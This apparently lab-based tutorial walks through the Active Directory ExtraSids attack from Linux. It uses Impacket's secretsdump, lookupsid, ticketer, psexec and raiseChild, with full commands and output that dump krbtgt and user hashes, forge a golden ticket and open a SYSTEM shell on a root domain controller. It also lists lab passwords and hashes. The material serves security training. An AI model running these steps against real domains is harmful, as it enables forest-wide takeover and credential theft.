---
title: "Active Directory Series - Introduction to the ExtraSids Attack - From Linux - Episode05"
datePublished: Thu Mar 28 2024 06:23:11 GMT+0000 (Coordinated Universal Time)
cuid: cluaulyss000108jn4b4v9wrj
slug: active-directory-series-introduction-to-the-extrasids-attack-from-linux-episode05

---

## **Introduction**

This guide will walk you through the detailed process of attacking domain trusts to escalate privileges from a compromised child domain to the parent domain. By forging trust tickets using the child domain's `krbtgt` hash and SID, along with the target user and Enterprise Admins SID from the parent domain, you can gain administrative access to the root domain.

### **Key concepts:**

* **Domain trusts** enable access and resource sharing between domains.
    
* **Trust tickets (TGTs)** prove a user's identity when accessing resources across trusts.
    
* **The**`krbtgt` account hash is used to sign all tickets in a domain.
    
* **The domain SID** is a unique identifier for the domain.
    
* **The golden ticket attack** forges trust tickets to access any resource/account.
    

## **Information Needed**

To perform this attack, you need to gather the following information:

1. The NTLM hash of the `krbtgt` account in the child domain.
    
2. The SID of the child domain.
    
3. The FQDN of the child domain.
    
4. The name of a target user to impersonate (doesn't need to be a real user).
    
5. The SID of the Enterprise Admins group in the root domain.
    

## **Dumping the**`krbtgt` Hash

Use [`secretsdump.py`](http://secretsdump.py) from Impacket to perform a DCSync attack against the child domain controller. Specify the FQDN, a domain admin username, password, and target just the `krbtgt` user:

```powershell
secretsdump.py CHILDDOMAIN/user:password@CHILDDC -just-dc-user CHILDDOMAIN/krbtgt

┌─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
```

Note down the NTLM hash for the `krbtgt` account returned in the format:

```powershell
krbtgt:RID:lmhash:ntlmhash:::
```

## **Finding Domain SIDs**

Use [`lookupsid.py`](http://lookupsid.py) from Impacket to enumerate the SID for the child domain. Target the child domain controller, an account with domain admin rights, and grep for the "Domain SID" line:

```powershell
lookupsid.py CHILDDOMAIN/user:password@CHILDDC | grep "Domain SID"

 $lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

Repeat the process, targeting the forest root domain controller to get its domain SID. Append the RID for the Enterprise Admins group (519) to the root domain SID:

```powershell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise"
Password:
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 172.16.5.5
[*] StringBinding ncacn_np:172.16.5.5[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
520: INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
521: INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
522: INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
525: INLANEFREIGHT\Protected Users (SidTypeGroup)
526: INLANEFREIGHT\Key Admins (SidTypeGroup)
527: INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
```

## **Forging the Golden Ticket**

Use [`ticketer.py`](http://ticketer.py) from Impacket to create a forged trust ticket (golden ticket) for a non-existent user to impersonate:

```powershell
ticketer.py -nthash KRBTGTHASH -domain CHILDFQDN -domain-sid CHILDDOMAINSID -extra-sid ROOTDOMAINSID-519 FAKEUSER
```

This will save the forged ticket in `FAKEUSER.ccache`.

Set the `KRB5CCNAME` environment variable to tell the system to use this ticket:

```powershell
export KRB5CCNAME=FAKEUSER.ccache
```

## **Accessing the Root Domain**

| Required Items |  |
| --- | --- |
| htb\_student\_adm Password | HTB\_@cademy\_stdnt\_admin! |
| NTLM hash of the krbtgt account in the child domain | krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f::: |
| SID of the child domain | S-1-5-21-2806153819-209893948-922872689 |
| FQDN of the child domain | logistics.inlanefreight.local |
| Name of a target user to impersonate (doesn't need to be a real user) | hacker |
| SID of Domain Admin Users | S-1-5-21-2806153819-209893948-922872689-512 |
| SID of the Enterprise Admins group in the root domain | S-1-5-21-3842939050-3880317879-2865463114-519 |

Use Impacket's [`psexec.py`](http://psexec.py) to try authenticating to the root domain controller with the forged ticket, specifying the target IP:

```powershell
psexec.py CHILDFQDN/FAKEUSER@ROOTDC -k -no-pass -target-ip ROOTDCIP

# Created ticket
└──╼ $ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

If successful, you will get a SYSTEM shell on the root domain controller by using [psexec.py](http://psexec.py)

```powershell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

```powershell
[htb-student@ea-attack01]─[~]
└──╼ $export KRB5CCNAME=hacker.ccache 
┌─[htb-student@ea-attack01]─[~]
└──╼ $psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file NsHgaujn.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service GsvV on 172.16.5.5.....
[*] Starting service GsvV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Accessing another user on domain

```powershell
└──╼ $secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
```

### Explanation of above attack:

* `hacker@academy-ea-dc01.inlanefreight.local`: This specifies that you're attempting the operation as the user `hacker` against the domain controller at `academy-ea-dc01.inlanefreight.local`.
    
* `k`: This flag tells [`secretsdump.py`](http://secretsdump.py) to use Kerberos authentication. When used, it assumes that a valid Kerberos ticket is available in the cache, which allows authentication without specifying a password.
    
* `no-pass`: This option is used alongside `k` to indicate that no password will be provided for the operation.
    
* `just-dc-ntlm`: Specifies that only the NTLM hash (as opposed to both LM and NTLM hashes) should be dumped.
    
* `just-dc-user bross`: Targets the operation to only dump information for the user `bross`.
    

### **Why the Command Succeeds**

1. **Kerberos Ticket**: The `k` option indicates that the `hacker` user has a valid Kerberos ticket-granting ticket (TGT) in their cache. This is typically obtained after a successful Kerberos authentication process within the domain. Having this ticket allows the `hacker` user to authenticate to the domain controller as a legitimate user without needing the password at the time of this command execution.
    
2. **Elevated Privileges or Delegated Permissions**: For [`secretsdump.py`](http://secretsdump.py) to dump the NTLM hash of a user directly from the domain controller, the executing account (`hacker` in this case) must have elevated privileges in the domain or specific delegated permissions to read such sensitive information. This usually means that `hacker` is either a Domain Admin, has been granted rights to perform a DCSync attack (replicating some of the data from the domain controller), or the domain's security settings are misconfigured to allow lower-privileged accounts to access this information.
    
3. **Domain Configuration and Security Policies**: The domain's configuration and security policies play a significant role. In a well-secured domain, only highly privileged accounts (like Domain Admins) should be able to extract sensitive data like NTLM hashes. If `hacker` can perform this operation, it may indicate that the account has been granted more permissions than standard users, or there are security policy misconfigurations.
    

### **Conclusion**

The ability of the `hacker` user to obtain `bross`'s NTLM hash suggests that the user is leveraging a valid Kerberos ticket for authentication and possesses the necessary privileges or permissions to access sensitive information from the domain controller. This operation is a critical part of lateral movement and privilege escalation in a domain compromise scenario, emphasizing the importance of strict access controls and monitoring within an Active Directory environment.

## **Using Impacket's**[`raiseChild.py`](http://raiseChild.py)

For a more automated approach, you can use **raise**[**Child.py**](http://Child.py) which handles the process end-to-end: Specify the child domain FQDN, domain admin credentials, and target IP of the root domain controller:

```powershell
raiseChild.py -target-exec ROOTDCIP CHILDFQDN/user:password
```

The script will dump hashes, create the golden ticket, and `psexec` to the root DC.

## **Key Takeaways**

* Compromising the `krbtgt` hash and SID of a child domain allows forging trust tickets.
    
* These trust tickets enable authentication as any user to the parent domain.
    
* Aim to compromise the `krbtgt` hash using DCSync from a domain admin account.
    
* Use SID enumeration to get the domain SIDs and append the Enterprise Admins RID.
    
* Automated tools like [`raiseChild.py`](http://raiseChild.py) can handle the whole process.
    
* Understand the manual process in case you need to troubleshoot.
    

This attack abuses the implicit trust from child to parent domains. By forging trust tickets, you can compromise the entire forest. Protecting the `krbtgt` account and using hardened domain trusts are key mitigations.